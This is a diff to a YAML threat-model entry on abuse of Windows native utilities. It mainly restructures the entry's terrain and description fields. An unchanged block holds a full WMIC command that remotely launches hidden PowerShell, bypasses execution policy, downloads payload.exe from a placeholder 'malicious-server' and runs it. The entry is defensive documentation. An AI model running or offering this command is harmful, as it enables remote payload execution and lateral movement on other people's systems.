@@ -25,15 +25,12 @@ threat:
   chaining:
     - relation: atomicity::implements
       vector: d5039f2c-9fcc-4ba3-ad6a-da8c891ba745
-      description: |-
-        This TVM is implementing the bigger TVM : Abuse of Windows Utilities
-  terrain: |-
-    Adversary has access to a Windows system where native utilities are available 
-    and can execute commands without restrictions.
-
-    Domains: Enterprise
-    Targets: Workstations, Public-Facing Servers, Laptop, Virtual Machines
-    Platforms: Windows, PowerShell
+      description: 'This TVM is implementing the bigger TVM : Abuse of Windows Utilities'
+  terrain:
+    - Windows
+    - Windows::Desktop
+    - Web Servers
+    - Azure::Compute::Virtual Machines
   severity: Significant incident
   leverage: Elevation of privilege; Software installation; Information Disclosure; Modify configuration
   impact: Data Breach; Reputational Damages; Business disruption
@@ -77,3 +74,6 @@ threat:
     ```
     wmic /node:"REMOTE_COMPUTER_NAME" process call create "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command \"Invoke-WebRequest -Uri 'http://malicious-server/payload.exe' -OutFile 'C:\\Windows\\Temp\\payload.exe'; Start-Process 'C:\\Windows\\Temp\\payload.exe'\""
     ```
+
+    Adversary has access to a Windows system where native utilities are available 
+    and can execute commands without restrictions.
